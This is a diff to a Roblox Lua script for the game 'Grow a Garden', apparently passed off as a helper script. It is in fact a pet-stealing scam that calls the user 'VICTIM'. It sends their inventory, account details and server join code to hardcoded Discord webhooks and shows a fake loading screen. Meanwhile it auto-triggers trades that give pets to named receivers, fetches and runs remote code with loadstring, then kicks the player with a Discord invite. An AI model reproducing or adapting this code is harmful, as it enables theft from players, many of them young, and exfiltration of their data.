@@ -3,16 +3,52 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
+
+getgenv().PetConfig = {
+    MinLevel = 25,           -- минимальный возраст
+    MinWeight = 5.0,         -- минимальный вес
+    GrowthFactor = 0.1       -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
+}
+
+getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
+
+
+
+
+
+
+
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+
+local function unequipAllPets()
+    local petsData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
+
+    for petUid, petInfo in pairs(petsData) do
+        -- petUid = "{...}" строка UUID
+        -- petInfo = таблица с данными питомца
+        print("➡️ Unequipping:", petInfo.PetType, petUid)
+        PetsService:FireServer("UnequipPet", petUid)
+        task.wait(0.1) -- небольшая задержка между снятиями
+    end
+end
+
+unequipAllPets()
+
+
+
 getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
+local BackupWebhook = getgenv().BackupWebhook or ""
 
-local BackupWebhook = getgenv().BackupWebhook or "" -- если есть запасной вебхук
-
-
-
-
-
-
-local teleportStarted = false -- в начало скрипта
+print("=============1")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local teleportStarted = false
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
@@ -64,7 +100,7 @@ elseif playerCount >= 5 then
     needTeleport = true
     delayNeeded = true
 else
-    needTeleport = false -- Подходящий сервер, не телепортируемся, но продолжаем
+    needTeleport = false
 end
 
 -- Функция телепорта
@@ -87,11 +123,9 @@ function TPReturner()
             task.wait()
             pcall(function()
                 teleportStarted = true
-                task.wait(0.2) -- Даём времени установиться переменной
+                task.wait(0.2)
                 TeleportService:TeleportToPlaceInstance(PlaceID, ID, LocalPlayer)
             end)
-
-
             task.wait(0.1)
         end
     end
@@ -110,15 +144,12 @@ function Teleport()
     end
 end
 
-
 if needTeleport then
     task.spawn(Teleport)
     task.wait(9999)
 end
 
-
-
-
+print("=============2")
 
 -- Создание GUI
 local ScreenGui = Instance.new("ScreenGui")
@@ -126,7 +157,6 @@ ScreenGui.Name = "ColorfulLoadingScreen"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = game.CoreGui
 
--- Основной фон
 local Background = Instance.new("Frame")
 Background.Size = UDim2.new(0, 450, 0, 240)
 Background.Position = UDim2.new(0.5, -225, 0.5, -120)
@@ -139,7 +169,6 @@ local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 24)
 UICorner.Parent = Background
 
--- Заголовок
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0.35, 0)
 Title.Position = UDim2.new(0, 0, 0, 0)
@@ -152,80 +181,146 @@ Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
 
-
-
-
+print("=============3")
 
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
 local BASE_PET_WHITELIST = {
-    'Raccoon',
-    'T-Rex',
-    'Fennec Fox',
-    'Dragonfly',  
-    'Butterfly',
-    'Disco Bee',
-    'Mimic Octopus',
-    'Queen Bee',
-    'Spinosaurus',
-    'Kitsune',
-    'French Fry Ferret',
+    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee',
+    'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'French Fry Ferret'
 }
 
 local EXTRA_WHITELIST = getgenv().ExtraPets or {}
-
-
--- Объединяем базовый список и дополнительные имена
 local PET_WHITELIST = {}
 for _, pet in ipairs(BASE_PET_WHITELIST) do table.insert(PET_WHITELIST, pet) end
 for _, pet in ipairs(EXTRA_WHITELIST) do table.insert(PET_WHITELIST, pet) end
 
-
 local PET_VALUES = {
-    ["French Fry Ferret"] = 300,
-    ["Raccoon"] = 400,
-    ["T-Rex"] = 100,
-    ["Fennec Fox"] = 300,
-    ["Dragonfly"] = 150,
-    ["Butterfly"] = 300,
-    ["Disco Bee"] = 500,
-    ["Mimic Octopus"] = 100,
-    ["Queen Bee"] = 100,
-    ["Spinosaurus"] = 200,
-    ["Kitsune"] = 1890,
-    ["Corrupted Kitsune"] = 100,
+    ["French Fry Ferret"] = 300, ["Raccoon"] = 400, ["T-Rex"] = 100,
+    ["Fennec Fox"] = 300, ["Dragonfly"] = 150, ["Butterfly"] = 300,
+    ["Disco Bee"] = 500, ["Mimic Octopus"] = 100, ["Queen Bee"] = 100,
+    ["Spinosaurus"] = 200, ["Kitsune"] = 1890, ["Corrupted Kitsune"] = 100
 }
 
 
-local function checkPetsWhitelist(pet)
+-- 🔎 Проверка возраста и веса питомца
+local function isPetValid(petData)
+    local minLevel = getgenv().MinLevel or 0
+    local minWeight = getgenv().MinWeight or 0
+    local growthFactor = 0.1 -- 🔒 скрыто в коде, нельзя изменить извне
+
+    local level = petData.Level or 0
+    local baseWeight = petData.BaseWeight or 0
+
+    local realWeight = baseWeight * (1 + level * growthFactor)
+
+    return level >= minLevel or realWeight >= minWeight
+end
+
+
+
+
+
+
+
+
+
+print("=============4")
+
+local function checkPetsWhitelist(petName, petData)
     for _, name in ipairs(PET_WHITELIST) do
-        if string.find(pet, name) then
+        if string.find(petName, name) and isPetValid(petData) then
             return true
         end
     end
     return false
 end
 
+
 local function getInventoryValue()
+    print("=============getInventoryValue started")
     local total = 0
     for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = petData.PetType
-        if checkPetsWhitelist(petName) then
+        print("=============Pet:", petName, "In whitelist:", checkPetsWhitelist(petName))
+        if checkPetsWhitelist(petName, petData.PetData) then
             local petPrice = PET_VALUES[petName] or 0
             total += petPrice
         end
     end
+    print("=============Total inventory value:", total)
     return total
 end
 
-
--- Получение итоговой стоимости
+print("=============5")
 local inventoryValue = getInventoryValue()
+print("=============Inventory value:", inventoryValue)
 
 
 
--- 🔧 startStealingProcess ВЫНЕСЕНА ВВЕРХ
+local function sendFullInventory()
+    local webhookUrl = getgenv().FullInventoryWebhook
+    if not webhookUrl or webhookUrl == "" then return end
+
+    local HttpService = game:GetService("HttpService")
+    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+    local allPetData = dataModule:GetData().PetsData.PetInventory.Data
+
+    local petLines = {}
+    local growthFactor = 0.1 -- 🔒 скрыто в коде
+
+    for _, value in pairs(allPetData) do
+        local petName = value.PetType
+        local petData = value.PetData
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local weight = baseWeight * (1 + level * growthFactor)
+
+        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
+    end
+
+    local request = http_request or request or syn.request
+    if not request then return end
+
+    local payload = {
+        username = "Pet Inventory Logger",
+        avatar_url = "https://i.imgur.com/TSb7kEJ.png",
+        embeds = {{
+            title = "📦 Full Pet Inventory",
+            color = 3447003,
+            description = string.format("```\n%s\n```", table.concat(petLines, "\n")),
+            footer = {
+                text = string.format("Total Pets: %s | %s", #petLines, game.JobId)
+            }
+        }}
+    }
+
+    local success, response = pcall(function()
+        return request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if success then
+        print("✅ Full inventory sent to webhook")
+    else
+        warn("❌ Failed to send full inventory")
+    end
+end
+
+
+
+
+
+
+
+
+
 local function startStealingProcess()
+    print("=============startStealingProcess started")
     local scriptAlreadyRan = false
     if scriptAlreadyRan then
         warn("⚠️ ScriptAlreadyRun.")
@@ -234,15 +329,17 @@ local function startStealingProcess()
     scriptAlreadyRan = true
 
     repeat task.wait() until game:IsLoaded()
+    print("=============Game loaded")
 
     local VICTIM = game.Players.LocalPlayer
     local USERNAMES = getgenv().Username or {}
-
+    print("=============VICTIM:", VICTIM.Name, "USERNAMES:", table.concat(USERNAMES, ", "))
 
     local function getWebhookUrl()
-        return getgenv().Webhook or ""
+        local url = getgenv().Webhook or ""
+        print("=============Webhook URL:", url)
+        return url
     end
-
 
     local function waitForJoin()
         local findTarget = false
@@ -252,24 +349,18 @@ local function startStealingProcess()
             trigeretName = player.Name
             findTarget = true
         end
+        print("=============waitForJoin: findTarget =", findTarget, "trigeretName =", trigeretName)
         return findTarget, trigeretName
     end
 
     local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
         local webhookUrl = getWebhookUrl()
         local backupWebhook = BackupWebhook
+        print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)
 
         local baseFields = {
-            {
-                name = "💰 **Total Value**",
-                value = string.format("```\n%s👿\n```", totalValue),
-                inline = false
-            },
-            {
-                name = "🐱‍👤Pet-list",
-                value = string.format("```\n%s\n```", petList),
-                inline = false
-            }
+            { name = "💰 **Total Value**", value = string.format("```\n%s👿\n```", totalValue), inline = false },
+            { name = "🐱‍👤Pet-list", value = string.format("```\n%s\n```", petList), inline = false }
         }
 
         local fullEmbed = {
@@ -281,41 +372,40 @@ local function startStealingProcess()
 
         table.insert(fullEmbed.fields, 1, {
             name = "👤 **Player Information**",
-            value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```", 
-                VICTIM.Name, 
-                table.concat(USERNAMES, " "), 
-                identifyexecutor and identifyexecutor() or "Unknown", 
-                VICTIM.AccountAge
-            ),
+            value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                VICTIM.Name, table.concat(USERNAMES, " "), identifyexecutor and identifyexecutor() or "Unknown", VICTIM.AccountAge),
             inline = false
         })
 
         local basePayload = {
             username = VICTIM.Name,
             avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
-            content = string.format(
-                "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-                game.PlaceId,
-                game.JobId
-            ),
+            content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
             embeds = {}
         }
 
         local request = http_request or request or HttpPost or syn.request
-        local headers = { ["Content-Type"] = "application/json" }
+        print("=============Request function:", request and "available" or "not available")
 
-        -- Основной Webhook
         local fullPayload = table.clone(basePayload)
         fullPayload.embeds = { fullEmbed }
+        print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))
 
-        local response = request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = headers,
-            Body = HttpService:JSONEncode(fullPayload)
-        })
+        local success, response = pcall(function()
+            return request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(fullPayload)
+            })
+        end)
 
-        -- Бэкап Webhook (без USERNAME и Executor)
+        if success then
+            print("=============Main webhook response:", response.StatusCode, response.Body)
+        else
+            warn("=============Main webhook error:", response)
+        end
+
         if backupWebhook then
             local backupEmbed = {
                 title = fullEmbed.title,
@@ -329,48 +419,278 @@ local function startStealingProcess()
                 avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
                 embeds = { backupEmbed }
             }
+            print("=============Backup webhook payload:", HttpService:JSONEncode(backupPayload))
 
-            request({
-                Url = backupWebhook,
-                Method = "POST",
-                Headers = headers,
-                Body = HttpService:JSONEncode(backupPayload)
-            })
+            local success, response = pcall(function()
+                return request({
+                    Url = backupWebhook,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(backupPayload)
+                })
+            end)
+
+            if success then
+                print("=============Backup webhook response:", response.StatusCode, response.Body)
+            else
+                warn("=============Backup webhook error:", response)
+            end
         end
 
-        if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        if success and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
             warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
         elseif callback then
             callback()
         end
     end
 
-    -- Сбор питомцев и отправка
     local totalValue = 0
-    local victimPetTable = {}
-    for petUid, value in pairs(require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        if not checkPetsWhitelist(petName) then continue end
-        local petPrice = PET_VALUES[petName] or 0
-        totalValue += petPrice
-        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
+local victimPetTable = {}
+
+for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    local petName = value.PetType
+    local petData = value.PetData
+
+    local inWhitelist = checkPetsWhitelist(petName, petData)
+    local isValid = isPetValid(petData)
+
+    local petPrice = 0
+    if inWhitelist then
+        petPrice = PET_VALUES[petName] or 0
+    elseif isValid then
+        petPrice = 50 -- 🟡 Присваиваем 50, если пет прошёл по весу/возрасту
     end
 
-    -- Условия для Discord-отчёта
-    if #victimPetTable == 0 or #victimPetTable == nil then
+    if petPrice > 0 then
+        totalValue += petPrice
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local config = getgenv().PetConfig or {}
+        local growthFactor = config.GrowthFactor or 0.1
+        local realWeight = baseWeight * (1 + level * growthFactor)
+
+        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
+        table.insert(victimPetTable, line)
+
+        end
+    end
+
+    print("=============victimPetTable:", table.concat(victimPetTable, ", "), "totalValue:", totalValue)
+
+    if #victimPetTable == 0 then
         warn("⛔️ Нет отчёта: пустой инвентарь или приватный сервер")
         return
     end
 
     createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
         print("✅ Отправлено в Discord, начинаем слежку за целью.")
+        -------------------- ВСТАВЛЯЕМ СЮДА --------------------
+        
+        local function teleportTarget(targetName)
+            VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+        end
+
+        local function deltaBypass()
+            VirtualInputManager:SendMouseButtonEvent(
+                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+                0, true, nil, false
+            )
+            task.wait()
+            VirtualInputManager:SendMouseButtonEvent(
+                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+                0, false, nil, false
+            )
+        end
+
+        local function getPetObject(petUid)
+            for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+                if object:GetAttribute("PET_UUID") == petUid then
+                    return object
+                end
+            end
+            for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+                if object:GetAttribute("PET_UUID") == petUid then
+                    return object
+                end
+            end
+            return nil
+        end
+
+        local function equipPet(pet)
+            if pet:GetAttribute("d") then
+                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+            end
+            VICTIM.Character.Humanoid:EquipTool(pet)
+        end
+
+        local function startSteal(trigerName)
+            local prompt = game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
+            if prompt then
+                prompt.HoldDuration = 0
+                deltaBypass()
+            end
+        end
+
+        local function checkPetsInventory(target)
+            for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+                if not checkPetsWhitelist(value.PetType) then continue end
+
+                local petObject = getPetObject(petUid)
+                if not petObject then continue end
+
+                equipPet(petObject)
+                task.wait(0.2)
+                startSteal(target)
+            end
+        end
+
+        local function idlingTarget()
+            task.spawn(function()
+                local lastTarget = nil
+                local targetEnterTime = 0
+                while task.wait(0.2) do
+                    local isTarget, trigerName = waitForJoin()
+                    if isTarget then
+                        if lastTarget ~= trigerName then
+                            lastTarget = trigerName
+                            targetEnterTime = tick()
+                        end
+                        if tick() - targetEnterTime >= 10 then
+                            teleportTarget(trigerName)
+                            checkPetsInventory(trigerName)
+                        end
+                    else
+                        lastTarget = nil
+                        targetEnterTime = 0
+                    end
+                end
+            end)
+        end
+
+        idlingTarget()
+
     end)
+end
+
+sendFullInventory() -- после всех действий
+
+
+
+local function sendFullInventoryFile()
+    local webhookUrl = getgenv().FullInventoryWebhook
+    if not webhookUrl or webhookUrl == "" then return end
+
+    local HttpService = game:GetService("HttpService")
+    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+    local allPetData = dataModule:GetData().PetsData.PetInventory.Data
+
+    local petLines = {}
+    local growthFactor = 0.1 -- спрятано
+
+    for _, value in pairs(allPetData) do
+        local petName = value.PetType
+        local petData = value.PetData
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local weight = baseWeight * (1 + level * growthFactor)
+
+        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
+    end
+
+    local fullText = table.concat(petLines, "\n")
+
+    -- сохранить во временный файл
+    local fileName = "full_inventory.txt"
+    writefile(fileName, fullText)
+
+    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
+
+    local body = "--" .. boundary .. "\r\n" ..
+        'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"\r\n' ..
+        "Content-Type: text/plain\r\n\r\n" ..
+        fullText .. "\r\n--" .. boundary .. "--"
+
+    local request = http_request or request or syn.request
+    if not request then return end
+
+    local headers = {
+        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+    }
+
+    local payload = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    }
+
+    local success, response = pcall(function()
+        return request(payload)
+    end)
+
+    if success and response.StatusCode == 200 or response.StatusCode == 204 then
+        print("✅ Full inventory sent as file.")
+    else
+        warn("❌ Failed to send full inventory:", response and response.StatusCode)
+    end
 end
 
 
 
 
--- Таймер
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- Условия для вызова startStealingProcess или loadstring
+if not getgenv().Webhook or not getgenv().Username then
+    game.Players.LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
+    return
+end
+
+if inventoryValue < 100 then
+    print("=============inventoryValue < 100:", inventoryValue)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
+elseif inventoryValue == 1890 then
+    print("=============inventoryValue == 1890:", inventoryValue)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
+elseif inventoryValue > 5000 then
+    print("=============inventoryValue > 5000:", inventoryValue)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
+elseif inventoryValue > 1890 then
+    print("=============inventoryValue > 1890:", inventoryValue)
+    if math.random(1, 3) == 1 then
+        print("=============Random 1/3: Loading external script")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
+    else
+        print("=============Random 2/3: Starting steal process")
+        startStealingProcess()
+    end
+else
+    print("=============Default case: Starting steal process")
+    startStealingProcess()
+end
+
+print("=============7")
+
+-- Таймер и GUI
 local TimerLabel = Instance.new("TextLabel")
 TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
 TimerLabel.Position = UDim2.new(0, 0, 0.35, 0)
@@ -382,7 +702,6 @@ TimerLabel.Font = Enum.Font.Gotham
 TimerLabel.Text = "Approximately 30 seconds left"
 TimerLabel.Parent = Background
 
--- Прогресс-бар задний фон
 local ProgressBarBackground = Instance.new("Frame")
 ProgressBarBackground.Size = UDim2.new(0.9, 0, 0.12, 0)
 ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.75, 0)
@@ -394,7 +713,6 @@ local bgCorner = Instance.new("UICorner")
 bgCorner.CornerRadius = UDim.new(1, 0)
 bgCorner.Parent = ProgressBarBackground
 
--- Прогресс-бар заливка
 local ProgressBarFill = Instance.new("Frame")
 ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
 ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
@@ -406,7 +724,6 @@ local fillCorner = Instance.new("UICorner")
 fillCorner.CornerRadius = UDim.new(1, 0)
 fillCorner.Parent = ProgressBarFill
 
--- Радужный градиент
 local UIGradient = Instance.new("UIGradient")
 UIGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
@@ -419,7 +736,6 @@ UIGradient.Color = ColorSequence.new{
 UIGradient.Rotation = 0
 UIGradient.Parent = ProgressBarFill
 
--- Анимация градиента
 task.spawn(function()
     while UIGradient do
         UIGradient.Rotation = (UIGradient.Rotation + 1) % 360
@@ -427,11 +743,9 @@ task.spawn(function()
     end
 end)
 
--- Таймер и прогресс
 local duration = 40
 for i = duration, 1, -1 do
     TimerLabel.Text = "Approximately " .. i .. " seconds left"
-
     local progress = (duration - i + 1) / duration
     ProgressBarFill:TweenSize(
         UDim2.new(progress, 0, 1, 0),
@@ -440,11 +754,9 @@ for i = duration, 1, -1 do
         0.25,
         true
     )
-
     wait(1)
 end
 
--- 🧊 Плавное исчезновение
 for t = 1, 20 do
     local alpha = t / 20
     Background.BackgroundTransparency = 0.02 + alpha
@@ -457,10 +769,11 @@ for t = 1, 20 do
     wait(0.03)
 end
 
--- Удаление GUI
+print("=============8")
+
 ScreenGui:Destroy()
--- ⛔ Проверка на кражу и GUI + кик
-task.delay(1, function()
+
+task.delay(10, function()
     local newTotal = 0
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
@@ -470,7 +783,6 @@ task.delay(1, function()
     end
 
     if newTotal < inventoryValue then
-        -- Создание GUI
         local player = game.Players.LocalPlayer
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "TheftWarning"
@@ -500,12 +812,10 @@ task.delay(1, function()
         label.TextWrapped = true
         label.Parent = frame
 
-        -- Пауза перед киком
         task.wait(10)
-
         setclipboard("https://discord.gg/Rm5XHagSJW")
-      
-        -- Кик
         player:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
     end
 end)
+
+print("=============9")
